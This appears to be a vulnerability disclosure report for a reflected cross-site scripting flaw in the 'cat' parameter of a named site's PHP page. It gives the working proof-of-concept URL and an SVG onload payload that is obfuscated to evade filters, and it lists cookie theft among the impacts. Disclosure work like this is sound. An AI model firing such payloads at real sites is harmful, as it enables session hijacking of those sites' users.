# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-controlled input is reflected back into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="u7g1kd"
http://kzlabs.com/14.php?cat=xicorr%22%3E%3CsVg/oNlOaD=alealertrt(1)%3E
```

---

## Vulnerable Parameter

```text id="o2q9vl"
cat
```

---

## Payload Used

```html id="f3j1as"
xicorr"><sVg/oNlOaD=alealertrt(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/14.php?cat=xicorr%22%3E%3CsVg/oNlOaD=alealertrt(1)%3E
   ```

2. Observe that the payload is reflected in the HTML response.

3. The injected SVG `onload` event executes JavaScript automatically.

4. A popup dialog appears confirming successful XSS execution.

---

## Proof of Concept

```text id="w8r2pe"
http://kzlabs.com/14.php?cat=xicorr%22%3E%3CsVg/oNlOaD=alealertrt(1)%3E
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/c99842c9-6ac7-4044-b824-796087d4ced4" />

---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
